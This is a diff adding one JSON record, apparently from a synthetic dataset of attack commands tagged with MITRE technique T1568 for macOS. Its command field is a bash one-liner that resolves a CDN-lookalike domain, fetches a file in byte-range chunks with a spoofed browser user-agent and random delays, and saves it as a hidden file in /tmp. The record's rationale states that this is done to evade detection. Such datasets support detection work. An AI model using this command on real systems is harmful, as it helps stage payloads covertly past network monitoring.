@@ -1,0 +1,22 @@
+{
+  "technique_id": "T1568",
+  "platform": "macOS",
+  "shell": "bash",
+  "command": "d=\"assets-cdn-cache.net\"; ip=$(dig +short \"$d\" | head -1); ua=\"Mozilla/5.0 (Macintosh; Intel Mac OS X) AppleWebKit/605.1.15\"; if [ -n \"$ip\" ]; then wget -q --header=\"Host: $d\" --user-agent=\"$ua\" --header=\"Range: bytes=0-511\" \"http://$ip/assets/img/sprite.png\" -O /tmp/.p1; sleep $((RANDOM%2+1)); wget -q --header=\"Host: $d\" --user-agent=\"$ua\" --header=\"Range: bytes=512-1023\" \"http://$ip/assets/img/sprite.png\" -O /tmp/.p2; cat /tmp/.p1 /tmp/.p2 > /tmp/.sprite && rm /tmp/.p1 /tmp/.p2; fi",
+  "explanation": "Resolves a CDN-like domain at runtime and downloads content in small HTTP ranges to fragment traffic, resembling partial asset fetches common in browsers.",
+  "rationale_steps": [
+    "Resolve target domain to current IP at runtime.",
+    "Use Range headers to fragment transfer into small chunks.",
+    "Introduce timing delay to reduce detectability and reassemble locally."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-6ea66e0e-1581247c",
+  "source_prompt_hash": "6ea66e0e",
+  "timestamp_utc": "2025-09-30T03:15:34.833319Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
